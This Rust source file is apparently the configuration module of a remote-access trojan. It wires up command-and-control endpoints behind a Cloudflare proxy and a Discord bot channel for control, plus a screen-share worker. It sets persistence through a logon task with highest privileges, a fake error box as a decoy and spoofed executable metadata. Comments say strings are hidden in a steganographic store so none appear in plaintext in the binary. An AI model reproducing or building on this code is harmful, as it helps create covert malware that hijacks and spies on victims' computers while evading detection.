use std::collections::HashSet;
use crate::core::stego_store::StegoStore;

// Generated constants: A6_C2_PRIMARY etc. are random u32 values.
// Format: {CAT_CODE}_{KEY_NAME}  — no plaintext key string in binary.
include!(concat!(env!("OUT_DIR"), "/generated_key_map.rs"));

#[derive(Debug)] pub struct KeepActiveConfig { pub enabled: bool, pub interval_seconds: u64 }
#[derive(Debug)] pub struct WifiMonitorConfig { pub enabled: bool, pub check_interval_ms: u64, pub re_enable_delay_seconds: u64, pub block_user_input: bool }
#[derive(Debug)] pub struct StartupConfig { pub enabled: bool, pub task_name: String, pub on_logon: bool, pub highest_privileges: bool }
#[derive(Debug)] pub enum MessageBoxIcon { Error, Warning, Info, Question }
#[derive(Debug)] pub enum MessageBoxButtons { Ok, OkCancel, YesNo }
#[derive(Debug)] pub struct DecoyConfig { pub enabled: bool, pub title: String, pub message: String, pub icon: MessageBoxIcon, pub buttons: MessageBoxButtons }
#[derive(Debug)] pub struct BuildInfo { pub file_name: String, pub product_name: String, pub description: String, pub company_name: String, pub file_version: String }
#[derive(Debug, Clone)] pub struct AuthConfig { pub auth_all: bool, pub allowed_roles: HashSet<String>, pub allowed_users: HashSet<String>, pub auth_roles: bool, pub auth_user: bool }

pub struct Config;

impl Config {
    #[inline(always)]
    fn v(idx: u32) -> String { StegoStore::at(idx) }

    // A6 = CONFIG category
    pub fn get_c2_endpoints() -> Vec<String>      { vec![Self::v(A6_C2_PRIMARY), Self::v(A6_C2_BACKUP)] }
    pub fn get_cloudflare_proxy() -> String        { Self::v(A6_C2_PRIMARY) }
    pub fn get_shared_secret() -> String           { Self::v(A6_SHARED_SECRET) }
    pub fn get_guildid() -> u64                    { Self::v(A6_GUILD_ID).parse().unwrap_or(0) }
    pub fn get_bot_prefix() -> String              { Self::v(A6_BOT_PREFIX) }
    pub fn get_global_channel_id() -> String       { Self::v(A6_GLOBAL_CHANNEL_ID) }
    pub fn get_screen_share_worker_url() -> String { Self::v(A6_SCREEN_SHARE_WORKER_URL) }

    pub fn get_startup_config() -> StartupConfig {
        StartupConfig { enabled: true, task_name: Self::v(A6_TASK_NAME), on_logon: true, highest_privileges: true }
    }
    pub fn get_decoy_config() -> DecoyConfig {
        DecoyConfig { enabled: true, title: Self::v(A6_DECOY_TITLE), message: Self::v(A6_DECOY_MESSAGE), icon: MessageBoxIcon::Error, buttons: MessageBoxButtons::Ok }
    }
    pub fn get_auth_config() -> AuthConfig {
        AuthConfig { auth_all: true, allowed_roles: HashSet::new(), allowed_users: HashSet::new(), auth_roles: false, auth_user: false }
    }
    pub fn get_keep_active_config() -> KeepActiveConfig { KeepActiveConfig { enabled: true, interval_seconds: 60 } }
    pub fn get_wifi_monitor_config() -> WifiMonitorConfig {
        WifiMonitorConfig { enabled: false, check_interval_ms: 500, re_enable_delay_seconds: 3, block_user_input: false }
    }
    pub fn get_build_info() -> BuildInfo {
        BuildInfo {
            file_name: Self::v(A6_EXE_NAME), product_name: Self::v(A6_PRODUCT_NAME),
            description: Self::v(A6_PRODUCT_DESC), company_name: Self::v(A6_COMPANY_NAME),
            file_version: Self::v(A6_FILE_VERSION),
        }
    }
    pub fn get_exe_name() -> String       { Self::get_build_info().file_name }
    pub fn get_install_subdir() -> String  { Self::v(A6_INSTALL_SUBDIR) }
    pub fn get_max_bfilesize() -> usize   { (10.0_f64 * 1024.0 * 1024.0) as usize }

    // Alias for files that still use Config::MAX_FILE_SIZE_MB
    pub const MAX_FILE_SIZE_MB: usize = 10;
}
